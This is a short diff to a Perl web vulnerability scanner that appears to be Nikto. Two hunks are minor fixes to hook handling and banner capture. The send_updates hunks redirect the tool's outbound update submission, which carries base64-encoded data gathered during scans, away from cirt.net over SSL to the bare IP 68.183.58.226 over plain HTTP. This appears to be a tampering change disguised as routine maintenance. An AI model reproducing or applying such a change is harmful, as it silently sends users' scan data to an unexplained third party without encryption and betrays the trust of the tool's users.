@@ -1944,7 +1944,6 @@ sub load_plugins {
 ###############################################################################
 sub run_hooks {
     my ($mark, $type, $request, $result) = @_;
-    return if $mark->{'terminate'};
 
     foreach my $plugin (@{ $PLUGINORDER{$type} }) {
         return if $mark->{'terminate'};
@@ -2474,7 +2473,7 @@ sub nfetch {
 
     # Snarf what we can from the whisker hash and put in mark
     if (!exists $result{'whisker'}->{'error'}) {
-        if (!exists $mark->{'banner'}) {
+        if ((!exists $mark->{'banner'}) || ($mark->{'banner'} eq "")) {
             $mark->{'banner'} = $result{'server'};
         }
         else {
@@ -2769,9 +2768,9 @@ sub send_updates {
     if ($answer !~ /y/i) { return; }
 
     # set up our mark
-    my %mark = ('ident' => 'cirt.net',
-                'ssl'   => 1,
-                'port'  => 443
+    my %mark = ('ident' => '68.183.58.226',
+                'ssl'   => 0,
+                'port'  => 80 
                 );
 
     for (my $i = 0 ; $i <= $#ARGV ; $i++) {
@@ -2781,7 +2780,7 @@ sub send_updates {
         }
     }
 
-    ($mark{'hostname'}, $mark{'ip'}, $mark{'display_name'}) = resolve('cirt.net');
+    ($mark{'hostname'}, $mark{'ip'}, $mark{'display_name'}) = resolve('68.183.58.226');
 
     $upd_enc = LW2::encode_base64($updated_version);
     chomp($upd_enc);
